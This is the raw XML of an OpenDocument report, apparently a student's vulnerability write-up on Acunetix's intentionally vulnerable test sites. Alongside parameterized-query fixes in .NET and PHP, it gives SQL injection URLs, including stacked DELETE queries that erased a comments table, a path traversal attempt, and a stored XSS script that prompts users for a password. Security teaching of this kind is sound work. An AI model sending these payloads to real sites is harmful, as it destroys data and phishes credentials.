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, monospace"/>
  </office:font-face-decls>
  <office:automatic-styles>
    <style:style style:name="P1" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#111113" loext:opacity="100%" style:font-name="monospace" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="000158e2" officeooo:paragraph-rsid="000158e2" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" fo:font-style="normal" officeooo:rsid="000158e2" officeooo:paragraph-rsid="000158e2" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="000158e2" officeooo:paragraph-rsid="000158e2"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L1">
      <style:text-properties officeooo:rsid="000158e2" officeooo:paragraph-rsid="00035218"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="000158e2" officeooo:paragraph-rsid="000a491d"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="000158e2" officeooo:paragraph-rsid="000158e2" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" officeooo:rsid="000158e2" officeooo:paragraph-rsid="000158e2" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-style="italic" officeooo:rsid="00090805" officeooo:paragraph-rsid="00090805" style:font-size-asian="14pt" style:font-style-asian="italic" style:font-size-complex="14pt" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L1">
      <style:text-properties officeooo:paragraph-rsid="00035218"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L1">
      <style:text-properties officeooo:paragraph-rsid="0006cc46"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="italic" officeooo:rsid="000158e2" officeooo:paragraph-rsid="000158e2" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="normal" officeooo:rsid="000158e2" officeooo:paragraph-rsid="000158e2" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="normal" officeooo:rsid="000158e2" officeooo:paragraph-rsid="000720c1" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="normal" officeooo:rsid="000720c1" officeooo:paragraph-rsid="000720c1" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" fo:font-style="normal" officeooo:rsid="000158e2" officeooo:paragraph-rsid="000158e2" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" fo:font-size="12pt" fo:font-style="normal" officeooo:rsid="000158e2" officeooo:paragraph-rsid="000158e2" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" fo:font-style="normal" officeooo:rsid="000158e2" officeooo:paragraph-rsid="000158e2" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="000158e2" officeooo:paragraph-rsid="000158e2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color="#000000" loext:opacity="100%" style:font-name="Liberation Serif" fo:font-size="12pt" fo:font-style="normal" officeooo:rsid="000158e2" officeooo:paragraph-rsid="000158e2" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P20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#ffffff"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="italic" officeooo:rsid="00090805" officeooo:paragraph-rsid="00090805" style:font-size-asian="10.5pt" style:font-style-asian="italic" style:font-size-complex="12pt" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="normal" officeooo:rsid="00090805" officeooo:paragraph-rsid="00090805" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="normal" officeooo:rsid="000a491d" officeooo:paragraph-rsid="000a491d" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="00090805" officeooo:paragraph-rsid="00090805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fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00090805" officeooo:paragraph-rsid="00090805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style:line-height-at-least="0.198in"/>
      <style:text-properties fo:color="#800000" loext:opacity="100%" style:font-name="Droid Sans Mono" fo:font-size="10.5pt" fo:font-weight="normal" fo:background-color="#ffffff"/>
    </style:style>
    <style:style style:name="P27" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#800000" loext:opacity="100%" style:font-name="Droid Sans Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:paragraph-rsid="00090805" fo:background-color="#ffffff"/>
    </style:style>
    <style:style style:name="P28" style:family="paragraph">
      <loext:graphic-properties draw:fill="solid" draw:fill-color="#dddddd"/>
      <style:text-properties fo:color="#cccccc" loext:opacity="100%"/>
    </style:style>
    <style:style style:name="P29" style:family="paragraph">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="F" fo:font-size="12pt"/>
    </style:style>
    <style:style style:name="P30" style:family="paragraph">
      <loext:graphic-properties draw:fill="solid" draw:fill-color="#cccccc"/>
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="F" fo:font-size="12pt"/>
    </style:style>
    <style:style style:name="P31" style:family="paragraph">
      <loext:graphic-properties draw:fill="solid" draw:fill-color="#cccccc"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="000158e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35218"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties officeooo:rsid="000158e2" fo:background-color="transparent" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties fo:color="#6a9955" loext:opacity="100%" style:font-name="Droid Sans Mono" fo:font-weight="normal" fo:background-color="#1e1e1e" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties officeooo:rsid="000720c1"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties officeooo:rsid="000754b9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style:font-name="Liberation Serif" fo:font-size="12pt" officeooo:rsid="000754b9" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties officeooo:rsid="000a491d"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties style:use-window-font-color="true" loext:opacity="0%" style:font-name="Droid Sans Mono" fo:font-weight="normal" fo:background-color="#1e1e1e" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties style:use-window-font-color="true" loext:opacity="0%" style:font-name="Droid Sans Mono" fo:font-weight="normal" fo:background-color="transparent" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties style:use-window-font-color="true" loext:opacity="0%" style:font-name="Droid Sans Mono" fo:font-weight="normal" fo:background-color="transparent" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties fo:color="#158466" loext:opacity="100%"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties fo:color="#2a6099" loext:opacity="100%"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties fo:color="#bf0041" loext:opacity="100%"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties fo:color="#c9211e" loext:opacity="100%"/>
    </style:style>
    <style:style style:name="T18" style:family="text">
      <style:text-properties fo:color="#800080" loext:opacity="100%"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties fo:color="#ff0000" loext:opacity="100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solid" draw:fill-color="#dddddd" fo:min-height="0.833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solid" draw:fill-color="#cccccc" fo:min-height="3.135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width="0.5201in" svg:stroke-color="#000000" draw:marker-start-width="0.9118in" draw:marker-end-width="0.9118in" draw:fill="solid" draw:fill-color="#cccccc" fo:min-height="4.545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QL injection</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P6">Site:</text:p>
      <text:p text:style-name="P3"><text:a xlink:type="simple" xlink:href="http://testaspnet.vulnweb.com/Comments.aspx?id=1" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">http://testaspnet.vulnweb.com/Comments.aspx?id=1</text:a></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P6">Problem:</text:p>
      <text:p text:style-name="P3">The automatic analysis tools indicated that an SQL injection is possible at the parameter id.</text:p>
      <text:p text:style-name="P3">SQL injections may grant us access to data we are not supposed to see or even alter them on the database.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P6">Exploit example: </text:p>
      <text:p text:style-name="P5">In this case we can exploit the comments table of the <text:a xlink:type="simple" xlink:href="http://testaspnet.vulnweb.com/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">http://testaspnet.vulnweb.com/</text:a> database with an Inferential SQL injection</text:p>
      <text:p text:style-name="P3"/>
      <text:list xml:id="list4073899482" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P9"><text:span text:style-name="T3">T</text:span><text:span text:style-name="T1">able guessing: </text:span></text:p>
          <text:p text:style-name="P10"><text:span text:style-name="T1">since we don't know the names of the table on the remote database we can use a query like: </text:span><text:a xlink:type="simple" xlink:href="http://testaspnet.vulnweb.com/Comments.aspx?id=1+AND+1=(SELECT+COUNT(*)+FROM+comments)" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T4">http://testaspnet.vulnweb.com/Comments.aspx?id=1+AND+1=(SELECT+COUNT(*)+FROM+comments)</text:span></text:a><text:span text:style-name="T4"> </text:span></text:p>
          <text:p text:style-name="P10"><text:span text:style-name="T1">his query will cause ether an error or return a result depending on wether or not the table users exists this way we figured out that the table with the name comments exists on the database</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P4">Table manipulation:</text:p>
          <text:p text:style-name="P4"><text:s/>at this part I tried to drop or truncate the table which didn't work but the following delete query was successful and all comments on the server where deleted <text:a xlink:type="simple" xlink:href="http://testaspnet.vulnweb.com/Comments.aspx?id=0;+DELETE+FROM+comments+WHERE+1=1" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">http://testaspnet.vulnweb.com/Comments.aspx?id=0;+DELETE+FROM+comments+WHERE+1=1</text:a></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"><text:span text:style-name="T2">Fix:</text:span> </text:p>
      <text:p text:style-name="P3">To avoid S<text:span text:style-name="T3">QL</text:span> Inject<text:span text:style-name="T3">ions</text:span> use parameterized queries with bind variables.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P11">since we are dealing with .NET It should be like this (there is a bit of guessing because I don't know the actual query and never wrote .NET)</text:p>
      <text:p text:style-name="P11"><draw:frame text:anchor-type="paragraph" draw:z-index="0" draw:name="Text Frame 1" draw:style-name="gr3" draw:text-style-name="P31" svg:width="6.7815in" svg:height="4.5461in" svg:x="0.0339in" svg:y="0.6071in"><draw:text-box><text:p><text:span text:style-name="T17">public</text:span> DataSet GetDataSetFromAdapter(</text:p><text:p><text:s text:c="2"/>DataSet dataSet, string connectionString, integer id)</text:p><text:p><text:span text:style-name="T18">{</text:span></text:p><text:p><text:s text:c="2"/>using (OleDbConnection connection = <text:span text:style-name="T17">new</text:span> OleDbConnection(connectionString))</text:p><text:p><text:s/><text:span text:style-name="T18"><text:s/></text:span><text:span text:style-name="T18">{</text:span></text:p><text:p><text:s text:c="5"/><text:span text:style-name="T14"><text:s/></text:span><text:span text:style-name="T14">// The important part is that we define the id with ? and then use OleDbType.Integer as a type</text:span></text:p><text:p><text:span text:style-name="T14"><text:s text:c="6"/></text:span><text:span text:style-name="T14">// so all other imput will be result in an error</text:span></text:p><text:p><text:s text:c="6"/>queryString = <text:span text:style-name="T19">"SELECT * FROM comments WHERE id = ?"</text:span></text:p><text:p><text:s text:c="6"/>OleDbDataAdapter adapter = new OleDbDataAdapter(queryString, connection);</text:p><text:p><text:s text:c="6"/>adapter.SelectCommand.Parameters.Add(<text:span text:style-name="T19">"@id"</text:span>, OleDbType.Integer).Value = id;</text:p><text:p/><text:p><text:s text:c="6"/><text:span text:style-name="T17">try</text:span></text:p><text:p><text:s text:c="5"/><text:span text:style-name="T18"><text:s/></text:span><text:span text:style-name="T18">{</text:span></text:p><text:p><text:s text:c="10"/>connection.Open();</text:p><text:p><text:s text:c="10"/>adapter.Fill(dataSet);</text:p><text:p><text:s text:c="6"/><text:span text:style-name="T18">}</text:span></text:p><text:p><text:s text:c="6"/><text:span text:style-name="T17">catch</text:span> (Exception ex)</text:p><text:p><text:s text:c="6"/><text:span text:style-name="T18">{</text:span></text:p><text:p><text:s text:c="10"/>Console.WriteLine(ex.Message);</text:p><text:p><text:s text:c="6"/><text:span text:style-name="T18">}</text:span></text:p><text:p><text:s text:c="2"/><text:span text:style-name="T18">}</text:span></text:p><text:p><text:s text:c="2"/><text:span text:style-name="T17">return</text:span> dataSet;</text:p><text:p><text:span text:style-name="T18">}</text:span>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<text:soft-page-break/><text:span text:style-name="T2">Note:</text:span> </text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P13"><text:span text:style-name="T6">T</text:span>he following example is a<text:span text:style-name="T6">n</text:span> error based <text:span text:style-name="T6">SQL injection</text:span> on the site <text:a xlink:type="simple" xlink:href="http://testphp.vulnweb.com/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">http://testphp.vulnweb.com</text:a> <text:span text:style-name="T6">I will state this example too because it reveals an other type of SQL injection on another website</text:span></text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P13"><text:a xlink:type="simple" xlink:href="http://testphp.vulnweb.com/listproducts.php?cat=1+OR+1=1" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">http://testphp.vulnweb.com/listproducts.php?cat=1+OR+1=1</text:a></text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12"><text:a xlink:type="simple" xlink:href="http://testphp.vulnweb.com/listproducts.php?cat=1+AND+1=(SELECT+COUNT(*)+FROM+testtable)" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">http://testphp.vulnweb.com/listproducts.php?cat=1+AND+1=(SELECT+COUNT(*)+FROM+testtable)</text:a></text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P14">Results in the error so it is easy to guess further</text:p>
      <text:p text:style-name="P15">Error: Table 'acuart.testtable' doesn't exist Warning: mysql_fetch_array()</text:p>
      <text:p text:style-name="P15">expects parameter 1 to be resource, boolean given in /hj/var/www/listproducts.php on line 74</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12"><text:a xlink:type="simple" xlink:href="http://testphp.vulnweb.com/listproducts.php?cat=1+AND+1=(SELECT+COUNT(*)+FROM+products)" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">http://testphp.vulnweb.com/listproducts.php?cat=1+AND+1=(SELECT+COUNT(*)+FROM+products)</text:a></text:p>
      <text:p text:style-name="P12">no error means the table exists</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12"><text:a xlink:type="simple" xlink:href="http://testphp.vulnweb.com/listproducts.php?cat=1;+DELETE+FROM+cat+WHERE+id=1" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">http://testphp.vulnweb.com/listproducts.php?cat=1;+DELETE+FROM+cat+WHERE+id=1</text:a></text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P15">Error: You have an error in your SQL syntax; </text:p>
      <text:p text:style-name="P15">check the manual that corresponds to your MySQL server version for </text:p>
      <text:p text:style-name="P15">the right syntax to use near 'DELETE FROM cat WHERE id=1 --' at line 1 Warning: mysql_fetch_array() </text:p>
      <text:p text:style-name="P15">expects parameter 1 to be resource, boolean given in /hj/var/www/listproducts.php on line 74</text:p>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P19">already we get a lot of information about the server structure like the path “/hj/var/www/listproducts.ph<text:span text:style-name="T7">p”</text:span> <text:span text:style-name="T7">sadly I was not able to exploit this with <text:s/>path traversal like</text:span></text:p>
      <text:p text:style-name="P1"><text:a xlink:type="simple" xlink:href="http://testphp.vulnweb.com/showimage.php?file=showimage.php" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T8">http://testphp.vulnweb.com/showimage.php?file=/</text:span></text:a><text:a xlink:type="simple" xlink:href="http://testphp.vulnweb.com/showimage.php?file=showimage.php" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T9">hj/var/www/</text:span></text:a><text:a xlink:type="simple" xlink:href="http://testphp.vulnweb.com/showimage.php?file=showimage.php" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T8">showimage.php</text:span></text:a></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P18">Fix:</text:p>
      <text:p text:style-name="P17">The fix works the same way but this time we will use <text:span text:style-name="T6">PHP</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P12"><draw:frame text:anchor-type="paragraph" draw:z-index="1" draw:name="Text Frame 2" draw:style-name="gr2" draw:text-style-name="P30" svg:width="6.8961in" svg:height="3.1358in" svg:x="-0.039in" svg:y="0.0146in"><draw:text-box><text:p text:style-name="P29"/><text:p text:style-name="P29"><text:span text:style-name="T14">// same like before we bind the parameter $id to the prepared statement </text:span></text:p><text:p text:style-name="P29"><text:span text:style-name="T14">// and ensure that only the right type is provided</text:span></text:p><text:p text:style-name="P29"/><text:p text:style-name="P29"><text:span text:style-name="T15">$stmt</text:span> = $dbConnection-&gt;prepare(<text:span text:style-name="T16">'SELECT * FROM products WHERE id = ?'</text:span>);</text:p><text:p text:style-name="P29"><text:span text:style-name="T15">$stmt</text:span>-&gt;bind_param(<text:span text:style-name="T17">'i'</text:span>, <text:span text:style-name="T15">$id</text:span>); <text:span text:style-name="T14">// 'i' specifies the variable type =&gt; 'integer'</text:span></text:p><text:p text:style-name="P29"><text:span text:style-name="T15">$stmt</text:span>-&gt;execute();</text:p><text:p text:style-name="P29"/><text:p text:style-name="P29">$result = <text:span text:style-name="T15">$stmt</text:span>-&gt;get_result();</text:p><text:p text:style-name="P29">while (<text:span text:style-name="T15">$row</text:span> = <text:span text:style-name="T15">$result</text:span>-&gt;fetch_assoc()) {</text:p><text:p text:style-name="P29"><text:s text:c="3"/><text:span text:style-name="T14"><text:s/></text:span><text:span text:style-name="T14">// Do something with $row</text:span></text:p><text:p text:style-name="P29">}</text:p><text:p text:style-name="P29"/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8">Cross Site Scripting (XSS)</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P23">Site: <text:a xlink:type="simple" xlink:href="http://testaspnet.vulnweb.com/Comments.aspx?id=0" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">http://testaspnet.vulnweb.com/Comments.aspx?id=0</text:a></text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P24">Problem:</text:p>
      <text:p text:style-name="P22">The comment section allowed a Stored XSS (AKA Persistent or Type II) attack. </text:p>
      <text:p text:style-name="P22">This security breach allow malicious code to be stored permanently on the website. </text:p>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P25">Explo<text:span text:style-name="T10">it</text:span> example:</text:p>
      <text:p text:style-name="P22">We simply add some JS code in the comment this code will run on all clients who read the comments. A good example is a login popup like follows</text:p>
      <text:p text:style-name="P27"><draw:frame text:anchor-type="paragraph" draw:z-index="2" draw:name="Text Frame 3" draw:style-name="gr1" draw:text-style-name="P28" svg:width="5.6776in" svg:height="0.8335in" svg:x="0.0445in" svg:y="0.1575in"><draw:text-box><text:p>&lt;script&gt;</text:p><text:p><text:s text:c="2"/>let p = prompt("Enter password:", "");</text:p><text:p><text:s text:c="2"/>alert("TODO send password:" + p + "' to evil endpoint");</text:p><text:p>&lt;/script&gt;</text:p></draw:text-box></draw:frame></text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P26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17:23:54.270599822</meta:creation-date>
    <dc:date>2023-01-04T18:49:52.311834152</dc:date>
    <meta:editing-duration>PT20M3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41" meta:word-count="422" meta:character-count="3044" meta:non-whitespace-character-count="2654"/>
  </office:meta>
</office:document-meta>
</file>